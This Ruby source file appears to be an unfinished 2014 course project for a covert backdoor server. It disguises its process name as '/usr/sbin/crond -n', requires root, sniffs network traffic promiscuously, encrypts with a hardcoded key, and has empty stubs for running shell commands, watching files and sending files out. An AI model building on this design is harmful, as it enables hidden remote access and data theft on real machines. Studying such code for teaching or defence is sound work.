#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   server.rb - description goes here
--
-- PROGRAM:       server
--                ./server.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         notes might go here
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'

# rename process immediately
$0 = "/usr/sbin/crond -n"

## Variables

$KEY = OpenSSL::Digest::SHA256.new("verysecretkey").digest

## Application Strings
CONFIG_FILE = "not_important"
CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
CONFIG_FILE_DEFAULT << "\#\n"
CONFIG_FILE_DEFAULT << "\#\n"
CONFIG_FILE_DEFAULT << "\#\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"

## Functions
def exit_reason(reason)
    puts reason
    exit
end

def load_config_file
  if File.exists? CONFIG_FILE
    validate_config
  else
    create_default_config
  end 
end

def create_default_config
  File.open(CONFIG_FILE, 'a') do |f|
      f.write(CONFIG_FILE_DEFAULT)
  end
  exit_reason(CONFIG_CREATE)
end

def validate_config
  #Check if edited
  #Check if blank
  #parse lines

  @cfg_iface = "wlp2s0"
  @cfg_protocol = "tcp"
end

def start_listen_server
  puts "server listening"
  filter = "#{@cfg_protocol}"
  begin
    cap = PacketFu::Capture.new(:iface => @cfg_iface,
      :start => true,
      :promic => true,
      :filter => filter)
    cap.stream.each do |p|
      pkt =  PacketFu::Packet.parse(p)
      puts pkt
      #look at packets here
      #check for auth
      #commands

    end
  rescue Exception => e
    puts "error in packet capture"
    #if bad error raise exception to kill program
  end
end

def encrypt(msg)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.encrypt

  cipher.key = $KEY

  begin
      payload = cipher.update(msg)
      payload << cipher.final
  rescue Exception => e
      puts "encryption error"
  end
  return payload
end

def decrypt(payload)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.decrypt

  cipher.key = $KEY

  begin
      msg = cipher.update(payload)
      msg << cipher.final
  rescue Exception => e
      puts "decryption error"
  end
  return msg
end

def parse_payload(payload)

end

def execute_shell_command(command)

end

def start_watch(type, name)
  #type is file or folder
  
end

def send_file(file, destination)
  
end


## Main

# check for root
raise 'Must run as root' unless Process.uid == 0
load_config_file
begin
  listen_thread = Thread.new { start_listen_server }
  listen_thread.join

rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
  Thread.kill(listen_thread)
  exit 0
end
